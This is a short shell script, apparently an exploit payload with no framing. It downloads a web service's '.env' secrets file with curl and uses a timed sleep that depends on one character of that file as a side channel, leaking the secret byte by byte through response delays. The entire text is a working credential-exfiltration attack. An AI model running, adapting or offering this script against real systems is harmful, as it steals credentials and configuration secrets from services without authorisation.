#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +21 /wa|head -c1)" < 'z' ]&&sleep 25
sleep 12
